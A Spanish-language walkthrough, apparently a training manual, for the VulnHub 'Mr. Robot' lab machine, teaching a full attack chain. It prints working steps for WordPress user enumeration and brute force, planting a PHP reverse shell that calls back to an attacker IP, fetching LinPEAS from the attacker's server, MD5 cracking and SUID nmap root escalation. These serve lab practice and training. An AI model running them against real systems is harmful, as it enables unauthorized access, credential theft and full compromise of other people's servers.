```markdown
# Manual Técnico: Pentesting desde Cero — Máquina Mr. Robot
### Enumeración Web, Fuerza Bruta con BurpSuite, Reverse Shell en PHP y Escalada de Privilegios mediante SUID

---

## Tabla de Contenidos

1. [Introducción y Contexto](#1-introducción-y-contexto)
2. [Reconocimiento y Enumeración](#2-reconocimiento-y-enumeración)
   - 2.1 [Descubrimiento de la Máquina Víctima con Netdiscover](#21-descubrimiento-de-la-máquina-víctima-con-netdiscover)
   - 2.2 [Escaneo de Puertos con Nmap](#22-escaneo-de-puertos-con-nmap)
3. [Análisis de la Aplicación Web](#3-análisis-de-la-aplicación-web)
   - 3.1 [Enumeración de Directorios con Dirsearch y Nikto](#31-enumeración-de-directorios-con-dirsearch-y-nikto)
   - 3.2 [Análisis del Fichero robots.txt](#32-análisis-del-fichero-robotstxt)
   - 3.3 [Identificación del CMS: WordPress](#33-identificación-del-cms-wordpress)
4. [Explotación del Panel de Login de WordPress](#4-explotación-del-panel-de-login-de-wordpress)
   - 4.1 [Concepto Teórico: Enumeración de Usuarios por Mensaje de Error](#41-concepto-teórico-enumeración-de-usuarios-por-mensaje-de-error)
   - 4.2 [Captura de Petición HTTP con BurpSuite](#42-captura-de-petición-http-con-burpsuite)
   - 4.3 [Limpieza del Diccionario](#43-limpieza-del-diccionario)
   - 4.4 [Fuerza Bruta con BurpSuite Intruder](#44-fuerza-bruta-con-burpsuite-intruder)
   - 4.5 [Enumeración de Contraseña con WPScan](#45-enumeración-de-contraseña-con-wpscan)
5. [Obtención de Reverse Shell mediante WordPress](#5-obtención-de-reverse-shell-mediante-wordpress)
   - 5.1 [Concepto Teórico: Reverse Shell](#51-concepto-teórico-reverse-shell)
   - 5.2 [Inyección de PHP Shell en la Plantilla 404](#52-inyección-de-php-shell-en-la-plantilla-404)
   - 5.3 [Puesta en Escucha con Netcat o Penelope](#53-puesta-en-escucha-con-netcat-o-penelope)
6. [Post-Explotación: Movimiento Lateral](#6-post-explotación-movimiento-lateral)
   - 6.1 [Localización y Crackeo del Hash MD5](#61-localización-y-crackeo-del-hash-md5)
   - 6.2 [Cambio de Usuario con su robot](#62-cambio-de-usuario-con-su-robot)
7. [Escalada de Privilegios mediante SUID](#7-escalada-de-privilegios-mediante-suid)
   - 7.1 [Concepto Teórico: Bit SUID](#71-concepto-teórico-bit-suid)
   - 7.2 [Enumeración de Binarios SUID con LinPEAS o find](#72-enumeración-de-binarios-suid-con-linpeas-o-find)
   - 7.3 [Explotación de Nmap en Modo Interactivo](#73-explotación-de-nmap-en-modo-interactivo)
8. [Captura de Flags](#8-captura-de-flags)
9. [Resumen de Puntos Clave](#9-resumen-de-puntos-clave)
10. [Inventario Final de Herramientas](#10-inventario-final-de-herramientas)

---

## 1. Introducción y Contexto

La máquina **Mr. Robot** es un entorno de práctica de pentesting basado en **Linux** e inspirado en la serie homónima. Está disponible en plataformas como VulnHub y es ampliamente utilizada en formación de ciberseguridad ofensiva por su cadena de explotación clara y progresiva.

Las técnicas explotadas en esta máquina son:

- **Enumeración web:** descubrimiento de directorios, ficheros sensibles y tecnologías mediante herramientas especializadas.
- **Ataque de fuerza bruta con diccionario:** enumeración de usuario y contraseña sobre el panel de login de WordPress mediante BurpSuite Intruder y WPScan.
- **Reverse Shell en PHP:** inyección de código malicioso en la plantilla 404 del CMS para obtener acceso remoto a la máquina víctima.
- **Escalada de privilegios mediante SUID:** abuso de un binario con el bit SUID activado (Nmap) para obtener una shell como root.

El flujo de ataque sigue la metodología estándar de pruebas de penetración: reconocimiento → enumeración → identificación de vulnerabilidades → explotación → post-explotación → captura de flags.

La máquina contiene **tres flags** que deben ser localizadas a lo largo del proceso.

---

## 2. Reconocimiento y Enumeración

### 2.1 Descubrimiento de la Máquina Víctima con Netdiscover

En un entorno de red local (NAT o red interna), se utiliza **Netdiscover** para identificar los hosts activos mediante el protocolo ARP.

```bash
sudo netdiscover -r 192.168.2.0/24
```

**Descripción de los parámetros:**

| Flag/Parámetro | Descripción |
|----------------|-------------|
| `sudo` | Eleva los privilegios a root, necesario para operar a nivel de red. |
| `netdiscover` | Herramienta de descubrimiento de hosts mediante peticiones ARP. |
| `-r` | Especifica el rango de red a escanear en formato CIDR. |
| `192.168.2.0/24` | Rango de red objetivo. Debe adaptarse al segmento de la máquina atacante. |

**Interpretación de los resultados:**

Netdiscover devuelve una lista de hosts con su dirección IP y la dirección MAC correspondiente. Los tres primeros pares hexadecimales de la MAC identifican al fabricante del hardware de red virtualizado. En entornos VMware, la mayoría de las direcciones MAC mostrarán el prefijo del fabricante VMware. La entrada con una MAC de fabricante diferente corresponde a la máquina víctima.

> **Nota importante:** El protocolo ARP opera únicamente en redes locales. En entornos de examen o laboratorio montados sobre infraestructura cloud (como Amazon Web Services), Netdiscover no funcionará, ya que ARP no atraviesa infraestructuras de red enrutadas.

---

### 2.2 Escaneo de Puertos con Nmap

Una vez identificada la IP de la máquina víctima, se realiza un escaneo completo con detección de versiones y scripts NSE.

```bash
nmap -p- -sCV -Pn -n -vvv --open <IP_OBJETIVO> -oN escaneo.txt
```

**Descripción de los parámetros:**

| Flag | Descripción |
|------|-------------|
| `-p-` | Escanea los 65535 puertos TCP. |
| `-sC` | Ejecuta los scripts NSE (Nmap Scripting Engine) por defecto. |
| `-sV` | Detecta la versión de los servicios activos. |
| `-Pn` | Omite la fase de ping; asume que el host está activo. |
| `-n` | Desactiva la resolución DNS para acelerar el escaneo. |
| `-vvv` | Nivel de verbosidad máximo; muestra resultados en tiempo real. |
| `--open` | Muestra únicamente los puertos con estado abierto. |
| `<IP_OBJETIVO>` | Dirección IP de la máquina víctima. |
| `-oN escaneo.txt` | Guarda la salida en formato normal en el fichero especificado. |

Para obtener más detalle sobre puertos específicos (como el 80 y el 443), se recomienda un escaneo dirigido:

```bash
nmap -sCV -p 80,443 <IP_OBJETIVO>
```

**Puertos relevantes identificados en Mr. Robot:**

| Puerto | Estado | Servicio | Descripción |
|--------|--------|----------|-------------|
| 22 | Cerrado | SSH | No disponible como vector de entrada en esta fase. |
| 80 | Abierto | HTTP (Apache) | Servidor web con aplicación WordPress. |
| 443 | Abierto | HTTPS (Apache) | Versión cifrada del mismo servicio web. |

> **Buena práctica:** El flag `-oN` guarda la salida del escaneo para referencia posterior. Su uso es recomendable en toda auditoría para mantener un registro de los hallazgos.

**Resumen de puntos clave — Sección 2:**
- Netdiscover utiliza el protocolo ARP para descubrir hosts en la red local; no funciona en entornos cloud.
- La identificación del fabricante en la dirección MAC permite distinguir la máquina víctima del resto de hosts en la red.
- El escaneo con `-p-` garantiza que no se omita ningún puerto; combinar con `--min-rate` o `-T4` puede acelerar el proceso.
- El puerto 22 (SSH) aparece cerrado en esta máquina; el vector de entrada principal es el puerto 80 (HTTP).

---

## 3. Análisis de la Aplicación Web

### 3.1 Enumeración de Directorios con Dirsearch y Nikto

Con los puertos HTTP identificados, el siguiente paso es enumerar los directorios y recursos disponibles en el servidor web.

**Opción A — Dirsearch:**

```bash
dirsearch -u http://<IP_OBJETIVO>
```

**Opción B — Nikto:**

```bash
nikto -h http://<IP_OBJETIVO>
```

**Descripción comparativa de herramientas:**

| Herramienta | Tipo | Descripción |
|-------------|------|-------------|
| `dirsearch` | Enumerador de directorios | Realiza peticiones HTTP sobre un diccionario integrado para descubrir rutas existentes. Devuelve el código de respuesta HTTP de cada ruta. |
| `nikto` | Analizador web general | Analiza la aplicación web en busca de vulnerabilidades conocidas, versiones de software, cabeceras inseguras y directorios comunes. |
| `WPScan` | Analizador específico de WordPress | Orientado exclusivamente a aplicaciones WordPress; detecta versiones, plugins, temas y usuarios. |
| `gobuster` / `ffuf` / `dirb` | Enumeradores de directorios | Alternativas a dirsearch con funcionalidad equivalente. La elección depende de la preferencia del auditor. |

> **Criterio de selección:** Todas las herramientas de enumeración de directorios realizan la misma tarea fundamental. Es recomendable que cada auditor construya su propio conjunto de herramientas preferidas en función de la comodidad con la sintaxis y los resultados obtenidos en la práctica.

Al analizar los resultados, se deben priorizar las respuestas con código **HTTP 200** (recurso encontrado), prestando especial atención a rutas como `/admin`, `/wp-admin`, `/robots.txt` y `/sitemap.xml`.

---

### 3.2 Análisis del Fichero robots.txt

El fichero `robots.txt` instruye a los crawlers de los motores de búsqueda sobre qué rutas o ficheros no deben indexarse públicamente. Paradójicamente, su contenido revela recursos sensibles que el administrador no desea exponer en resultados de búsqueda.

```
http://<IP_OBJETIVO>/robots.txt
```

**Estructura típica de robots.txt:**

```
User-agent: *
Disallow: /wp-admin/
Disallow: /secret-file.txt
Disallow: /fsocity.dic
```

**Descripción de los campos:**

| Campo | Descripción |
|-------|-------------|
| `User-agent: *` | Aplica la directiva a todos los crawlers, independientemente del origen. |
| `Disallow:` | Indica la ruta o fichero que no debe ser indexado por los motores de búsqueda. |

En la máquina Mr. Robot, el fichero `robots.txt` expone dos recursos clave: un fichero de texto que contiene la **primera flag** (`key-1-of-3.txt`) y un fichero con extensión `.dic` que contiene un **diccionario de contraseñas** (`fsocity.dic`).

> **Nota de seguridad:** Un crawler de Google no accederá a las rutas listadas en `robots.txt`, pero un auditor de seguridad sí puede hacerlo manualmente. La presencia de rutas en `robots.txt` no constituye ningún mecanismo de control de acceso.

Para descargar el diccionario desde la línea de comandos:

```bash
wget http://<IP_OBJETIVO>/fsocity.dic
```

**Resumen de puntos clave — Sección 3:**
- El fichero `robots.txt` es una fuente de información valiosa durante la fase de enumeración web; siempre debe revisarse.
- Los recursos listados en `robots.txt` están accesibles públicamente; su presencia indica que el administrador considera su contenido sensible.
- La identificación del CMS (WordPress en este caso) permite focalizar los esfuerzos en vectores de ataque específicos de esa tecnología.

---

### 3.3 Identificación del CMS: WordPress

La presencia de rutas como `/wp-admin`, `/wp-login.php` o `/wp-content` indica que el servidor ejecuta **WordPress** como sistema de gestión de contenidos (CMS). Esta identificación puede confirmarse también mediante extensiones como **Wappalyzer**.

Una vez identificado el CMS, el recurso de referencia para la enumeración de vulnerabilidades específicas es **HackTricks**:

```
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
```

---

## 4. Explotación del Panel de Login de WordPress

### 4.1 Concepto Teórico: Enumeración de Usuarios por Mensaje de Error

WordPress, en su configuración por defecto, diferencia en el mensaje de error entre un **nombre de usuario incorrecto** y una **contraseña incorrecta**:

- Si el usuario **no existe**: devuelve `"Error: Invalid username."`
- Si el usuario **existe** pero la contraseña es incorrecta: devuelve `"Error: The password you entered for the username X is incorrect."`

Esta diferencia permite **enumerar usuarios válidos** sin necesidad de conocer la contraseña, reduciendo drásticamente el espacio de búsqueda en un ataque de fuerza bruta posterior.

**Impacto en la complejidad del ataque:**

| Escenario | Complejidad |
|-----------|-------------|
| Fuerza bruta directa (usuario + contraseña simultáneos) | O(n²) — inviable con diccionarios de 850.000 entradas |
| Enumeración de usuario primero, contraseña después | O(n) + O(n) — reducción drástica del número de intentos |

---

### 4.2 Captura de Petición HTTP con BurpSuite

**BurpSuite** es una plataforma de auditoría web que actúa como proxy interceptor entre el navegador y el servidor. Permite capturar, modificar y reenviar peticiones HTTP.

**Configuración del proxy en BurpSuite:**

1. Abrir BurpSuite y acceder a **Proxy > Intercept > Intercept is ON**.
2. Configurar el navegador para usar el proxy local `127.0.0.1:8080`.
3. Enviar el formulario de login de WordPress con credenciales arbitrarias.
4. Capturar la petición HTTP resultante en BurpSuite.

**Estructura de la petición POST capturada:**

```
POST /wp-login.php HTTP/1.1
Host: <IP_OBJETIVO>
...

log=admin&pwd=admin&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1
```

**Descripción de los parámetros del formulario:**

| Parámetro | Descripción |
|-----------|-------------|
| `log` | Campo del nombre de usuario. Es el parámetro objetivo para la enumeración de usuarios. |
| `pwd` | Campo de la contraseña. Será el objetivo en la segunda fase del ataque. |
| `wp-submit` | Botón de envío del formulario. |
| `redirect_to` | URL de redirección tras un login exitoso. |

---

### 4.3 Limpieza del Diccionario

El diccionario `fsocity.dic` contiene aproximadamente **858.000 líneas**, muchas de ellas duplicadas. Trabajar con un diccionario sin depurar aumenta innecesariamente el tiempo de ataque y el consumo de recursos.

Para eliminar duplicados y generar un diccionario limpio:

```bash
sort fsocity.dic | uniq > fsocity_limpio.txt
```

**Descripción de los comandos:**

| Comando | Descripción |
|---------|-------------|
| `sort` | Ordena alfabéticamente las líneas del fichero de entrada. La ordenación previa es necesaria para que `uniq` funcione correctamente, ya que este comando solo elimina líneas **consecutivas** duplicadas. |
| `\|` | Operador de tubería (pipe). Redirige la salida estándar del comando anterior como entrada del siguiente. |
| `uniq` | Elimina líneas consecutivas duplicadas del flujo de entrada. |
| `>` | Redirige la salida estándar al fichero especificado, creándolo o sobrescribiéndolo. |
| `fsocity_limpio.txt` | Fichero de salida con el diccionario depurado. |

Para verificar la reducción de líneas:

```bash
wc -l fsocity.dic
wc -l fsocity_limpio.txt
```

| Comando | Descripción |
|---------|-------------|
| `wc` | Herramienta de conteo (word count). |
| `-l` | Cuenta el número de líneas del fichero especificado. |

> El resultado esperado es una reducción de ~858.000 a ~11.000 líneas, lo que supone una mejora significativa en el rendimiento del ataque.

---

### 4.4 Fuerza Bruta con BurpSuite Intruder

**BurpSuite Intruder** es el módulo de BurpSuite destinado a la automatización de ataques sobre peticiones HTTP. Permite sustituir uno o varios parámetros de la petición capturada por los valores de un diccionario.

**Procedimiento — Fase 1: Enumeración de usuario**

1. En BurpSuite, hacer clic derecho sobre la petición capturada y seleccionar **Send to Intruder**.
2. En la pestaña **Positions**, seleccionar únicamente el valor del parámetro `log` (usuario) y marcarlo como payload con el botón **Add §**.
3. Acceder a la pestaña **Payloads** y cargar el diccionario limpio mediante **Load**.
4. Iniciar el ataque con **Start Attack**.

**Identificación del usuario válido:**

Todas las respuestas con usuario inexistente tendrán una longitud de respuesta uniforme (correspondiente al mensaje `"Invalid username"`). La respuesta con una longitud diferente corresponde a un usuario válido, identificable porque el mensaje de error cambia a `"The password you entered for the username X is incorrect"`.

En la máquina Mr. Robot, el usuario válido es: **`Elliot`**

**Procedimiento — Fase 2: Enumeración de contraseña**

Una vez conocido el usuario, se repite el proceso con el parámetro `pwd` fijo en `Elliot` y cargando el diccionario limpio en el campo de contraseña.

> **Limitación de la versión gratuita:** BurpSuite Community Edition limita la velocidad del módulo Intruder. Para ataques con diccionarios extensos, se recomienda BurpSuite Professional o herramientas alternativas como WPScan.

---

### 4.5 Enumeración de Contraseña con WPScan

**WPScan** es una herramienta de auditoría específica para WordPress que incluye, entre otras funcionalidades, la capacidad de realizar ataques de fuerza bruta sobre el panel de login.

```bash
wpscan --url http://<IP_OBJETIVO> -U Elliot -P fsocity_limpio.txt
```

**Descripción de los parámetros:**

| Flag | Descripción |
|------|-------------|
| `--url` | URL del WordPress objetivo. |
| `-U` | Especifica el nombre de usuario sobre el que se realizará el ataque de contraseña. |
| `-P` | Ruta al fichero de diccionario de contraseñas. |

**Resultado esperado:**

```
[SUCCESS] - Elliot / ER28-0652
```

La contraseña obtenida es: **`ER28-0652`**

**Resumen de puntos clave — Sección 4:**
- La diferencia en el mensaje de error de WordPress permite enumerar usuarios válidos sin conocer la contraseña.
- Limpiar el diccionario antes de usarlo reduce drásticamente el número de intentos necesarios (de ~858.000 a ~11.000 en este caso).
- BurpSuite Intruder permite ataques de fuerza bruta sobre cualquier parámetro de una petición HTTP; la versión gratuita tiene limitaciones de velocidad.
- WPScan es la herramienta recomendada para ataques de fuerza bruta específicos sobre WordPress.

---

## 5. Obtención de Reverse Shell mediante WordPress

### 5.1 Concepto Teórico: Reverse Shell

Una **reverse shell** es una técnica de acceso remoto en la que la **máquina víctima** establece una conexión de salida hacia la **máquina atacante**, y no al contrario. Esto permite eludir configuraciones de firewall que bloquean conexiones entrantes al servidor.

**Flujo de una reverse shell:**

```
[Máquina Atacante] ←──────── conexión TCP ─────── [Máquina Víctima]
   Netcat/Penelope                                  Código PHP malicioso
   (en escucha)                                     (ejecutado por Apache)
```

**Componentes necesarios:**
- En la máquina atacante: un listener (Netcat o Penelope) esperando conexiones en un puerto determinado.
- En la máquina víctima: código malicioso que, al ejecutarse, abre una conexión TCP hacia la IP y puerto del atacante y redirige la shell del sistema.

---

### 5.2 Inyección de PHP Shell en la Plantilla 404

WordPress permite editar el código PHP de sus plantillas directamente desde el panel de administración. La plantilla del error **404 (Not Found)** se activa cuando se accede a una ruta inexistente, lo que proporciona un mecanismo de activación controlado.

**Ruta en el panel de administración:**

```
Apariencia → Editor → 404 Template (404.php)
```

**Procedimiento:**

1. Acceder al editor de plantillas y localizar el fichero `404.php`.
2. Obtener una PHP reverse shell del sistema de ficheros de Kali Linux:

```bash
cat /usr/share/webshells/php/php-reverse-shell.php
```

**Descripción:**

| Ruta | Descripción |
|------|-------------|
| `/usr/share/webshells/` | Directorio de Kali Linux que contiene shells web listas para su uso en diferentes lenguajes (PHP, ASP, JSP, etc.). |
| `php-reverse-shell.php` | Reverse shell en PHP de PentestMonkey; ampliamente utilizada en CTFs y auditorías. |

3. Editar los valores de IP y puerto en la shell antes de insertarla:

```php
$ip = '192.168.2.128';   // IP de la máquina atacante
$port = 4444;             // Puerto en escucha en la máquina atacante
```

4. Copiar el contenido completo de la shell y reemplazar el contenido del fichero `404.php` en el editor de WordPress.
5. Guardar los cambios con **Update File**.

---

### 5.3 Puesta en Escucha con Netcat o Penelope

Antes de activar la plantilla maliciosa, es necesario abrir un listener en la máquina atacante para recibir la conexión entrante.

**Opción A — Netcat:**

```bash
nc -lvp 4444
```

**Descripción de los parámetros:**

| Flag | Descripción |
|------|-------------|
| `nc` | Netcat, herramienta de red multipropósito. |
| `-l` | Modo escucha (listen). Acepta conexiones entrantes. |
| `-v` | Modo verbose; muestra información de la conexión. |
| `-p 4444` | Puerto en el que se escuchará la conexión. |

**Opción B — Penelope (recomendado):**

```bash
penelope 4444
```

Penelope es un listener avanzado que gestiona automáticamente la TTY de la sesión, facilitando la ejecución de comandos interactivos sin necesidad de configuración adicional.

**Activación de la reverse shell:**

Una vez el listener está activo, acceder a cualquier ruta inexistente del servidor WordPress para disparar el error 404 y ejecutar el código PHP inyectado:

```
http://<IP_OBJETIVO>/ruta-inexistente-cualquiera
```

Si la configuración es correcta, la máquina víctima establecerá una conexión con el listener y se obtendrá una shell interactiva en el sistema remoto.

**Resumen de puntos clave — Sección 5:**
- En una reverse shell, la víctima se conecta al atacante; esto permite eludir reglas de firewall que bloquean conexiones entrantes.
- La IP y el puerto configurados en la PHP shell deben corresponder a la máquina atacante, no a la víctima.
- La plantilla 404 de WordPress es un vector de inyección fiable porque se activa de forma controlada al acceder a rutas inexistentes.
- Penelope gestiona la TTY automáticamente y es preferible a Netcat para sesiones interactivas.

---

## 6. Post-Explotación: Movimiento Lateral

### 6.1 Localización y Crackeo del Hash MD5

Tras obtener la reverse shell, la sesión inicial se establece con un usuario de baja privilegio (típicamente `daemon` o `www-data`). El siguiente paso es moverse hacia un usuario con más permisos.

En el directorio `/home/robot` se encuentran dos ficheros:

```bash
ls -la /home/robot
```

| Fichero | Permisos | Descripción |
|---------|----------|-------------|
| `key-2-of-3.txt` | Solo lectura para root | Segunda flag de la máquina. No accesible con el usuario actual. |
| `password.raw-md5` | Lectura pública | Contiene el nombre de usuario `robot` y su contraseña cifrada en MD5. |

Para leer el fichero de contraseña:

```bash
cat /home/robot/password.raw-md5
```

**Resultado esperado:**

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

El hash MD5 obtenido puede crackearse mediante servicios de búsqueda inversa online:

```
https://crackstation.net
```

**Resultado:** la contraseña en texto claro es **`abcdefghijklmnopqrstuvwxyz`**.

---

### 6.2 Cambio de Usuario con su robot

Con la contraseña obtenida, se cambia al usuario `robot`:

```bash
su robot
```

**Descripción:**

| Comando | Descripción |
|---------|-------------|
| `su` | Substitute User. Permite cambiar al usuario especificado en la sesión actual. Solicita la contraseña del usuario destino. |
| `robot` | Nombre del usuario al que se desea cambiar. |

> **Nota:** El comando `su` puede fallar en sesiones de shell no interactivas. Si se produce un error de TTY, se recomienda utilizar Penelope como listener (que gestiona la TTY automáticamente) o ejecutar el siguiente comando para obtener una TTY completa desde la shell actual:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

| Comando | Descripción |
|---------|-------------|
| `python -c '...'` | Ejecuta una instrucción Python en línea desde la shell. |
| `pty.spawn("/bin/bash")` | Crea una pseudo-terminal (PTY) completa sobre el proceso actual, habilitando comandos interactivos como `su`. |

Una vez como `robot`, se puede leer la segunda flag:

```bash
cat /home/robot/key-2-of-3.txt
```

**Resumen de puntos clave — Sección 6:**
- Los ficheros en `/home` de otros usuarios pueden contener información sensible accesible con permisos de lectura pública.
- Los hashes MD5 son reversibles mediante tablas rainbow; no deben utilizarse para almacenar contraseñas en sistemas modernos.
- Si `su` falla por falta de TTY, `python -c 'import pty; pty.spawn("/bin/bash")'` resuelve el problema.

---

## 7. Escalada de Privilegios mediante SUID

### 7.1 Concepto Teórico: Bit SUID

El bit **SUID (Set User ID)** es un permiso especial de Unix/Linux que, cuando se aplica a un binario ejecutable, provoca que dicho binario se ejecute con los privilegios del **propietario del fichero** (habitualmente root), independientemente del usuario que lo invoque.

**Ejemplo:** el comando `passwd` tiene el bit SUID activado para permitir que cualquier usuario cambie su propia contraseña, aunque el fichero `/etc/shadow` solo sea escribible por root.

**Implicación para el atacante:** si un binario con SUID de root ofrece funcionalidades que permiten ejecutar comandos arbitrarios o abrir una shell, es posible obtener una shell como root sin necesidad de conocer la contraseña del administrador.

---

### 7.2 Enumeración de Binarios SUID con LinPEAS o find

**Opción A — Comando find (nativo del sistema):**

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Descripción de los parámetros:**

| Flag/Parámetro | Descripción |
|----------------|-------------|
| `find /` | Busca recursivamente desde el directorio raíz. |
| `-perm -u=s` | Filtra ficheros que tienen activado el bit SUID para el propietario. |
| `-type f` | Limita la búsqueda a ficheros regulares (excluye directorios). |
| `2>/dev/null` | Redirige los mensajes de error (stderr) al dispositivo nulo, ocultando los errores de permiso denegado. |

**Opción B — LinPEAS (enumeración automática):**

LinPEAS es un script de enumeración automática de vectores de escalada de privilegios en sistemas Linux. Para transferirlo a la máquina víctima:

1. En la máquina atacante, levantar un servidor HTTP en el directorio donde se encuentra `linpeas.sh`:

```bash
python3 -m http.server 8080
```

2. En la máquina víctima, descargar el script al directorio `/tmp` (con permisos de escritura):

```bash
cd /tmp
wget http://192.168.2.128:8080/linpeas.sh
```

3. Ejecutar el script:

```bash
bash linpeas.sh
```

**Descripción:**

| Comando | Descripción |
|---------|-------------|
| `python3 -m http.server 8080` | Levanta un servidor HTTP simple en el puerto 8080 sirviendo los ficheros del directorio actual. |
| `wget <URL>` | Descarga el fichero de la URL especificada al directorio de trabajo actual. |
| `bash linpeas.sh` | Ejecuta el script con el intérprete bash. Alternativa a `./linpeas.sh` cuando no se tienen permisos de ejecución directa. |

> **Importante:** Descargar ficheros al directorio de trabajo del usuario puede fallar por falta de permisos de escritura. Utilizar siempre `/tmp` como directorio destino en la máquina víctima.

**Resultado clave:** entre los binarios con SUID activado, se identifica **`/usr/local/bin/nmap`**.

---

### 7.3 Explotación de Nmap en Modo Interactivo

Versiones antiguas de Nmap (anteriores a la 5.x) incluyen un **modo interactivo** que permite ejecutar comandos del sistema operativo directamente desde la consola de Nmap. Si Nmap tiene el bit SUID de root activado, estos comandos se ejecutarán como root.

La técnica está documentada en **GTFOBins**:

```
https://gtfobins.github.io/gtfobins/nmap/
```

**Procedimiento:**

```bash
nmap --interactive
```

Una vez dentro del modo interactivo de Nmap:

```
nmap> !sh
```

**Descripción:**

| Comando | Descripción |
|---------|-------------|
| `nmap --interactive` | Inicia el modo interactivo de Nmap (disponible en versiones <= 5.x). |
| `!sh` | Dentro del modo interactivo, ejecuta una shell del sistema. Al tener Nmap SUID de root, la shell se abre con privilegios de root. |

**Verificación de privilegios:**

```bash
whoami
# Resultado esperado: root
```

**Resumen de puntos clave — Sección 7:**
- El bit SUID permite que un binario se ejecute con los privilegios de su propietario, independientemente del usuario que lo invoque.
- GTFOBins es el recurso de referencia para identificar técnicas de explotación de binarios con permisos especiales.
- El directorio `/tmp` siempre tiene permisos de escritura y es el destino estándar para transferir herramientas a la máquina víctima.
- Versiones antiguas de Nmap con SUID de root son un vector de escalada de privilegios clásico en máquinas CTF.

---

## 8. Captura de Flags

La máquina Mr. Robot contiene tres flags distribuidas a lo largo del proceso de explotación:

| Flag | Ubicación | Acceso |
|------|-----------|--------|
| `key-1-of-3.txt` | `http://<IP_OBJETIVO>/key-1-of-3.txt` | Accesible sin autenticación (visible en `robots.txt`). |
| `key-2-of-3.txt` | `/home/robot/key-2-of-3.txt` | Requiere acceso como usuario `robot`. |
| `key-3-of-3.txt` | `/root/key-3-of-3.txt` | Requiere acceso como root. |

Para leer la tercera flag tras la escalada de privilegios:

```bash
cat /root/key-3-of-3.txt
```

---

## 9. Resumen de Puntos Clave

**Reconocimiento:**
- Netdiscover con el protocolo ARP permite descubrir hosts en redes locales. No funciona en entornos cloud.
- Nmap con `-p- -sCV` proporciona información completa de puertos y servicios; `-oN` guarda la salida para referencia posterior.

**Enumeración web:**
- `robots.txt` es siempre una fuente de información sensible; su análisis es obligatorio en toda auditoría web.
- La identificación del CMS (WordPress) permite focalizar los esfuerzos en vectores de ataque específicos.
- Dirsearch, Nikto, WPScan y herramientas equivalentes realizan la misma tarea fundamental; la elección depende de la preferencia del auditor.

**Explotación del login:**
- WordPress expone información sobre la validez del usuario en sus mensajes de error, lo que permite enumerar usuarios antes de atacar la contraseña.
- Limpiar el diccionario con `sort | uniq` antes de usarlo reduce exponencialmente el número de intentos necesarios.
- BurpSuite Intruder y WPScan son las herramientas recomendadas para ataques de fuerza bruta sobre WordPress.

**Reverse Shell:**
- En una reverse shell, la víctima se conecta al atacante; la IP y el puerto configurados en el payload deben ser los del atacante.
- La plantilla 404 de WordPress es un vector de inyección fiable y controlable.
- Penelope gestiona la TTY automáticamente y es preferible a Netcat para sesiones interactivas.

**Post-explotación y escalada:**
- Los hashes MD5 son vulnerables a ataques de tabla rainbow; CrackStation permite revertirlos en segundos.
- El bit SUID en binarios con privilegios de root es un vector de escalada de privilegios frecuente en entornos CTF.
- GTFOBins documenta técnicas de explotación para binarios con permisos especiales.
- El directorio `/tmp` es el destino estándar para la transferencia de herramientas a la máquina víctima.

---

## 10. Inventario Final de Herramientas

| Herramienta / Plataforma | Tipo | Descripción | Instalación / Disponibilidad |
|--------------------------|------|-------------|------------------------------|
| **Netdiscover** | Descubrimiento de red | Identifica hosts activos en la red local mediante el protocolo ARP. | Preinstalado en Kali Linux |
| **Nmap** | Escáner de red | Enumeración de puertos, servicios y versiones. Incluye scripts NSE para detección de vulnerabilidades. | Preinstalado en Kali Linux |
| **Dirsearch** | Enumerador de directorios | Descubre rutas y recursos en servidores web mediante diccionario. | Preinstalado en Kali Linux |
| **Nikto** | Analizador web | Analiza aplicaciones web en busca de vulnerabilidades conocidas, versiones y cabeceras inseguras. | Preinstalado en Kali Linux |
| **WPScan** | Analizador de WordPress | Auditoría específica de instalaciones WordPress: versiones, plugins, temas, usuarios y fuerza bruta. | Preinstalado en Kali Linux |
| **BurpSuite** | Plataforma de auditoría web | Proxy interceptor, módulo Intruder para fuerza bruta, Repeater y otras funcionalidades de hacking web. | Versión Community preinstalada en Kali Linux. Versión Pro de pago. |
| **FoxyProxy** | Extensión de navegador | Gestiona configuraciones de proxy en el navegador para facilitar el uso de BurpSuite. | Extensión para Firefox / Chrome |
| **Wappalyzer** | Extensión de navegador | Fingerprinting de tecnologías web: lenguajes, frameworks, CMS, servidores. | Extensión para Firefox / Chrome |
| **Netcat (nc)** | Herramienta de red | Listener para recibir conexiones de reverse shells. Multipropósito en redes TCP/UDP. | Preinstalado en Kali Linux |
| **Penelope** | Listener avanzado | Listener con gestión automática de TTY. Alternativa a Netcat para sesiones interactivas. | Instalación desde repositorio GitHub |
| **PHP Reverse Shell** | Payload | Shell PHP de PentestMonkey para obtener acceso remoto sobre servidores con intérprete PHP. | `/usr/share/webshells/php/` en Kali Linux |
| **LinPEAS** | Enumeración de privilegios | Script de enumeración automática de vectores de escalada de privilegios en Linux. | Descarga desde GitHub: `carlospolop/PEASS-ng` |
| **CrackStation** | Servicio online de cracking | Permite revertir hashes MD5, SHA1 y otros mediante búsqueda en tablas rainbow. | `https://crackstation.net` |
| **GTFOBins** | Base de datos de explotación | Documenta técnicas de abuso de binarios Unix con permisos especiales (SUID, sudo, capabilities). | `https://gtfobins.github.io` |
| **HackTricks** | Base de conocimiento | Referencia completa de técnicas de hacking, incluyendo secciones específicas por tecnología y protocolo. | `https://book.hacktricks.xyz` |
| **Python HTTP Server** | Servidor de ficheros | Levanta un servidor HTTP simple para la transferencia de herramientas a la máquina víctima. | Nativo en Python 3: `python3 -m http.server` |
| **wget** | Descarga de ficheros | Descarga ficheros desde URLs HTTP/HTTPS/FTP por línea de comandos. | Preinstalado en Kali Linux y en la mayoría de distribuciones Linux |
| **WordPress** | CMS | Sistema de gestión de contenidos. En esta máquina, actúa como superficie de ataque principal. | Nativo en la máquina Mr. Robot |
| **VulnHub / HTB** | Plataformas CTF | Plataformas de práctica de ciberseguridad con máquinas vulnerables en entornos controlados. | `https://www.vulnhub.com` / `https://www.hackthebox.com` |
```
